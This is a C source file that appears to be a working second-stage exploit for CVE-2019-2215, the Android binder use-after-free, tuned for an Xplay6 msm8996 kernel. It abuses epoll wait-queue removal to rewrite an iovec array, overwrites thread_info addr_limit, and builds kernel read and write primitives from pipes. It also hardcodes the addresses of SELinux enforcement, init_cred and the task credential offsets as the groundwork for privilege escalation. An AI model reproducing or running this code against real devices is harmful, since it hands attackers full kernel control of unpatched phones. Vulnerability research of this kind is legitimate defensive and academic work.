#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <sched.h>

/* CVE-2019-2215 stage 2 for Xplay6 / msm8996 3.18.20 (ledger S39/S40).
 *
 * Where the write comes from: access_ok runs ONCE at syscall entry against the
 * addresses we passed (all user pages, so it passes).  Then epoll_ctl(DEL) ->
 * remove_wait_queue() -> __list_del() writes the wait-head address H = slot+0x50 into
 * the kernel's own copy of our iovec array -- exactly the two words iovec[5].iov_base
 * and iovec[5].iov_len, because this build has thread->wait at +0x48.  The iterator
 * walks that same array, so the next data we send is copied to a destination the
 * kernel itself chose (the array), which lets our 80-byte chunk rewrite iovec[5..9]
 * in place and install a kernel VA as the destination of the following bytes.
 *
 * MODES
 *   arith            installs iovec[6..9] = four user canary slots and sends four
 *                   distinct qwords.  Decides the iterator semantics with ZERO kernel
 *                   writes: if the qwords show up in the canaries the "rewrite the
 *                   array, then advance" reading is right and the same chunk aimed at
 *                   thread_info+0x08 is the addr_limit clobber.
 *   clob <hex-ti>    same chunk with iovec[6] = ti+0x08, value = 0xfffffffffffffffe.
 *                   iovec[7] is aimed at a user page on purpose: a second write to
 *                   ti+0x10 would destroy thread_info.task, which current is built from.
 *   read <hex-ti>    clobber, then dump the verification set.
 */
#define PAGE             0x1000
#define IOVEC_ARRAY_SZ   25
#define WAITQUEUE_OFFSET 0x48
#define WQ               (WAITQUEUE_OFFSET / 16)     /* 4 here (poc98: 10) */
#define SLOT5            0x50
#define BINDER_THREAD_EXIT 0x40046208u
#define BLK              0x11000
#define MARK(j)          (0x10 + (j))
#define KERNEL_DS_VAL    0xfffffffffffffffeUL

#define SELINUX_ENFORCING 0xffffffc00189be74UL
#define INIT_CRED         0xffffffc001636d80UL
#define TASK_CRED_OFF     0x4a8
#define TASK_REALCRED_OFF 0x658
#define TASK_PID_OFF      0x470
#define TI_ADDR_LIMIT     0x08
#define TI_TASK           0x10

typedef uint64_t binder_size_t;
typedef uint64_t binder_uintptr_t;
struct binder_transaction_data {
    union { uint32_t handle; binder_uintptr_t ptr; } target;
    binder_uintptr_t cookie;
    uint32_t code;
    uint32_t flags;
    int32_t  sender_pid;
    uint32_t sender_euid;
    binder_size_t data_size;
    binder_size_t offsets_size;
    union { struct { binder_uintptr_t buffer; binder_uintptr_t offsets; } ptr; uint8_t buf[8]; } data;
};
struct binder_write_read {
    binder_size_t write_size;
    binder_size_t write_consumed;
    binder_uintptr_t write_buffer;
    binder_size_t read_size;
    binder_size_t read_consumed;
    binder_uintptr_t read_buffer;
};
#define BINDER_WRITE_READ  _IOWR('b', 1, struct binder_write_read)
#define BC_TRANSACTION     _IOW('c', 0, struct binder_transaction_data)

#define SEG5_NEW_BASE ((unsigned long)(uintptr_t)(fill + 8 * BLK))

static char *fill;
static unsigned long *canary;      /* 4 slots the arith value should land in */

struct iovec_patch {               /* copied to slot+0x50 => rewrites iovec[5..9] */
    unsigned long seg5_base, seg5_len;
    unsigned long seg6_base, seg6_len;
    unsigned long seg7_base, seg7_len;
    unsigned long seg8_base, seg8_len;
    unsigned long seg9_base, seg9_len;
};

static void pin0(void)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(0, &s);
    sched_setaffinity(0, sizeof s, &s);
}

static int arm_pending_tx(int fd)
{
    char wbuf[4 + sizeof(struct binder_transaction_data)];
    char payload[16], rbuf[256];
    struct binder_transaction_data tr;
    struct binder_write_read bwr, bwr2;
    uint32_t cmd = BC_TRANSACTION;
    int rc, n;

    memset(payload, 0, sizeof payload);
    memset(&tr, 0, sizeof tr);
    tr.target.handle = 0;
    tr.code = 2;
    tr.data_size = sizeof payload;
    tr.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)payload;
    memcpy(wbuf, &cmd, 4);
    memcpy(wbuf + 4, &tr, sizeof tr);
    memset(&bwr, 0, sizeof bwr);
    bwr.write_size = sizeof wbuf;
    bwr.write_buffer = (binder_uintptr_t)(uintptr_t)wbuf;
    errno = 0;
    rc = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (rc) { printf("  arm rc=%d errno=%d\n", rc, errno); return rc; }
    for (n = 0; n < 3; n++) {
        size_t off = 0;
        int complete = 0, reply = 0;
        memset(rbuf, 0, sizeof rbuf);
        memset(&bwr2, 0, sizeof bwr2);
        bwr2.read_size = sizeof rbuf;
        bwr2.read_buffer = (binder_uintptr_t)(uintptr_t)rbuf;
        errno = 0;
        rc = ioctl(fd, BINDER_WRITE_READ, &bwr2);
        while (off + 4 <= (size_t)bwr2.read_consumed) {
            uint32_t c;
            memcpy(&c, rbuf + off, 4);
            off += 4;
            if (c == 0x7206) complete = 1;
            else if (c == 0x80407203 || c == 0x80407202) { reply = 1; off += 64; }
        }
        printf("  drain %d: rc=%d rconsumed=%llu complete=%d reply=%d\n", n, rc,
               (unsigned long long)bwr2.read_consumed, complete, reply);
        if (rc) return rc;
        if (complete && !reply) return 0;
        if (reply) return -1;
    }
    return -1;
}

static int kread(unsigned long addr, int len, unsigned char *out)
{
    int pfd[2], rc, got = 0;
    unsigned char primer[8];
    struct iovec iov[2];

    if (pipe(pfd)) return -1;
    memset(primer, 0xA7, sizeof primer);
    iov[0].iov_base = primer;
    iov[0].iov_len = sizeof primer;
    iov[1].iov_base = (void *)(uintptr_t)addr;
    iov[1].iov_len = len;
    errno = 0;
    rc = (int)writev(pfd[1], iov, 2);
    if (rc < 0) { printf("  kread %016lx: writev errno=%d\n", addr, errno); close(pfd[0]); close(pfd[1]); return -1; }
    while (got < rc) {
        ssize_t n = read(pfd[0], out + got, rc - got);
        if (n <= 0) { if (n < 0 && errno == EINTR) continue; break; }
        got += (int)n;
    }
    close(pfd[0]); close(pfd[1]);
    if (got < (int)sizeof primer) return -1;
    memmove(out, out + sizeof primer, got - sizeof primer);
    return got - (int)sizeof primer;
}

static int kwrite(unsigned long addr, const void *buf, int len)
{
    int pfd[2], rc;
    struct iovec iov;

    if (pipe(pfd)) return -1;
    if (write(pfd[1], buf, len) != len) { close(pfd[0]); close(pfd[1]); return -1; }
    errno = 0;
    iov.iov_base = (void *)(uintptr_t)addr;
    iov.iov_len = len;
    rc = (int)readv(pfd[0], &iov, 1);
    if (rc < 0) printf("  kwrite %016lx: readv errno=%d\n", addr, errno);
    close(pfd[0]); close(pfd[1]);
    return rc == len ? 0 : -1;
}

static void dump_verify(unsigned long ti)
{
    unsigned char b[16];
    unsigned long task = 0, al = 0, cred = 0, rcred = 0;
    unsigned int v = 0xdeadbeef, p = 0;

    if (kread(ti + TI_ADDR_LIMIT, 8, b) == 8) memcpy(&al, b, 8);
    if (kread(ti + TI_TASK, 8, b) == 8) memcpy(&task, b, 8);
    printf("  ti %016lx: addr_limit=%016lx task=%016lx\n", ti, al, task);
    if (task < 0xffffff8000000000UL) { printf("  task implausible -> wrong candidate\n"); return; }
    if (kread(task + TASK_PID_OFF, 4, b) == 4) {
        memcpy(&p, b, 4);
        printf("  [task+0x%x] pid=%u ours=%d %s\n", TASK_PID_OFF, p, getpid(),
               p == (unsigned)getpid() ? "MATCH" : "no");
    }
    if (kread(task + TASK_CRED_OFF, 8, b) == 8) memcpy(&cred, b, 8);
    if (kread(task + TASK_REALCRED_OFF, 8, b) == 8) memcpy(&rcred, b, 8);
    printf("  cred=%016lx real_cred=%016lx init_cred=%016lx\n", cred, rcred, INIT_CRED);
    if (kread(SELINUX_ENFORCING, 4, b) == 4) {
        memcpy(&v, b, 4);
        printf("  selinux_enforcing=%u %s\n", v, v == 1 ? "(==1, readable: WE HAVE KERNEL READ)" : "");
    } else
        printf("  selinux_enforcing unreadable\n");
}

static int clobber_attempt(int arith, unsigned long dest, int *landed)
{
    struct iovec iov[IOVEC_ARRAY_SZ];
    struct epoll_event ev = { .events = EPOLLIN };
    struct iovec_patch ch;
    unsigned long val[4];
    int socks[2], fd, epfd, rc = -1, j, wrote = 0;
    pid_t pid;
    ssize_t r;
    unsigned long total = 0;
    void *map;

    epfd = epoll_create(1000);
    fd = open("/dev/binder", O_RDWR | O_NONBLOCK);
    if (fd < 0) { perror("open binder"); return -1; }
    map = mmap(NULL, 1 << 20, PROT_READ, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); close(fd); close(epfd); return -1; }

    memset(iov, 0, sizeof iov);
    for (j = 0; j < IOVEC_ARRAY_SZ; j++) {
        iov[j].iov_base = fill + (size_t)j * BLK;
        iov[j].iov_len = 0x100;
    }
    iov[WQ].iov_len = 0;                       /* wait.lock must read unlocked */
    iov[WQ + 1].iov_len = SLOT5 + 0x1000;
    for (j = 0; j < IOVEC_ARRAY_SZ; j++) total += iov[j].iov_len;

    memset(&ch, 0, sizeof ch);
    ch.seg5_base = SEG5_NEW_BASE;
    ch.seg5_len  = sizeof ch;                  /* 80: this chunk ends segment 5 */
    if (arith) {
        ch.seg6_base = (unsigned long)(uintptr_t)canary;      ch.seg6_len = 8;
        ch.seg7_base = (unsigned long)(uintptr_t)(canary + 1); ch.seg7_len = 8;
        ch.seg8_base = (unsigned long)(uintptr_t)(canary + 2); ch.seg8_len = 8;
        ch.seg9_base = (unsigned long)(uintptr_t)(canary + 3); ch.seg9_len = 8;
    } else {
        ch.seg6_base = dest;                                   /* ti+0x08 */
        ch.seg6_len  = 8;
        ch.seg7_base = (unsigned long)(uintptr_t)(fill + 12 * BLK);  /* harmless */
        ch.seg7_len  = 8;
        ch.seg8_base = (unsigned long)(uintptr_t)(canary + 2); ch.seg8_len = 8;
        ch.seg9_base = (unsigned long)(uintptr_t)(canary + 3); ch.seg9_len = 8;
    }

    val[0] = arith ? 0x1111111111111111UL : KERNEL_DS_VAL;
    val[1] = arith ? 0x2222222222222222UL : 0x3333333333333333UL;
    val[2] = arith ? 0x4444444444444444UL : 0x5555555555555555UL;
    val[3] = arith ? 0x6666666666666666UL : 0x7777777777777777UL;

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) { perror("socketpair"); goto out; }

    if (arm_pending_tx(fd)) goto out;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev)) { perror("ep_add"); goto out; }

    for (j = 0; j < 4; j++) canary[j] = 0xCCCCCCCCCCCCCCCCUL;
    *(unsigned long *)(fill + 8 * BLK) = 0xAAAAAAAAAAAAAAAAUL;
    memset(fill + 12 * BLK, 0xBB, 64);

    pid = fork();
    if (pid < 0) { perror("fork"); goto out; }
    if (pid == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        close(socks[0]);
        usleep(300000);
        alarm(4);
        if (epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &ev)) perror("child ep_del");
        alarm(0);
        if (write(socks[1], &ch, sizeof ch) != (ssize_t)sizeof ch) perror("child patch");
        if (write(socks[1], val, sizeof val) != (ssize_t)sizeof val) perror("child val");
        close(socks[1]);
        _exit(0);
    }
    close(socks[1]);

    alarm(25);
    errno = 0;
    if (ioctl(fd, BINDER_THREAD_EXIT, NULL)) { perror("THREAD_EXIT"); goto out; }
    errno = 0;
    {
        struct msghdr msg;
        memset(&msg, 0, sizeof msg);
        msg.msg_iov = iov;
        msg.msg_iovlen = IOVEC_ARRAY_SZ;
        r = recvmsg(socks[0], &msg, MSG_WAITALL);
        printf("  recvmsg -> %zd (entry total %llu) errno=%d flags=0x%x\n", r,
               (unsigned long long)total, errno, msg.msg_flags);
    }
    alarm(0);
    {
        int st = 0;
        waitpid(pid, &st, 0);
        printf("  child status=%d\n", st);
    }
    printf("  canary[0..3] = %016lx %016lx %016lx %016lx   (sent %016lx %016lx %016lx %016lx)\n",
           canary[0], canary[1], canary[2], canary[3], val[0], val[1], val[2], val[3]);
    printf("  seg5_new_base page first qword = %016lx (0xAAAA.. = untouched, patch bytes = landed)\n",
           *(unsigned long *)(fill + 8 * BLK));
    printf("  harmless seg7 page first 8 bytes = %02x%02x%02x%02x%02x%02x%02x%02x\n",
           (unsigned char)fill[12 * BLK], (unsigned char)fill[12 * BLK + 1],
           (unsigned char)fill[12 * BLK + 2], (unsigned char)fill[12 * BLK + 3],
           (unsigned char)fill[12 * BLK + 4], (unsigned char)fill[12 * BLK + 5],
           (unsigned char)fill[12 * BLK + 6], (unsigned char)fill[12 * BLK + 7]);
    if (canary[0] == val[0]) {
        wrote = 1;
        printf("  ==> iovec[6] honoured: the array was rewritten and the iterator advanced\n");
    } else if (*(unsigned long *)(fill + 8 * BLK) != 0xAAAAAAAAAAAAAAAAUL) {
        printf("  ==> the patch itself went to seg5_base (mid-segment re-read): different arithmetic\n");
    }
    if (landed) *landed = wrote;
    rc = 0;
out:
    if (rc) alarm(0);
    close(socks[0]);
    close(socks[1]);
    if (map != MAP_FAILED) munmap(map, 1 << 20);
    close(fd);
    close(epfd);
    return rc;
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "arith";
    int arith = !strcmp(mode, "arith");
    int tries = argc > 3 ? atoi(argv[3]) : 8;
    unsigned long dest = 0, ti = 0;
    int t, landed = 0;
    unsigned char b[8];

    setvbuf(stdout, NULL, _IONBF, 0);
    fill = calloc(IOVEC_ARRAY_SZ, BLK);
    if (!fill) { perror("fill"); return 1; }
    for (t = 0; t < IOVEC_ARRAY_SZ; t++) memset(fill + (size_t)t * BLK, MARK(t), BLK);
    canary = mmap(NULL, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (canary == MAP_FAILED) { perror("canary"); return 1; }
    pin0();

    if (!arith) {
        if (argc < 3) { printf("need thread_info hex\n"); return 1; }
        ti = strtoul(argv[2], NULL, 16);
        dest = ti + TI_ADDR_LIMIT;
        printf("mode=%s ti=%016lx -> writing %016lx\n", mode, ti, dest);
    } else
        printf("mode=arith (all destinations are our own pages)\n");

    for (t = 0; t < tries; t++) {
        printf("--- attempt %d ---\n", t);
        landed = 0;
        if (clobber_attempt(arith, dest, &landed)) { printf("  attempt failed\n"); continue; }
        if (!landed) continue;
        if (arith) { printf("  ARITHMETIC PROVEN (safe mode, nothing written in kernel)\n"); break; }
        if (kread(SELINUX_ENFORCING, 4, b) == 4) dump_verify(ti);
        break;
    }
    return 0;
}
